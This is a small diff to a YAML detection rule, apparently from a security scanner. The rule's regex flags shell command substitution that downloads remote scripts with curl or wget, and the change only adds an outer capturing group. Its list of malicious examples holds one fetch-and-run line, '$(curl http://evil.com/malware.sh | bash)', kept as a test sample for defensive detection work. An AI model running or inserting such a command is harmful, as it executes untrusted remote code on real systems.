@@ -4,7 +4,7 @@ description: >
   Detects shell command substitution, backticks, and process substitution downloading remote scripts.
 
 pattern: |
-  (?i)(\$\(|`|<\()(curl|wget).*(https?|ftp)://
+  (?i)((\$\(|`|<\()(curl|wget).*(https?|ftp)://)
 
 malicious:
   - "$(curl http://evil.com/malware.sh | bash)"
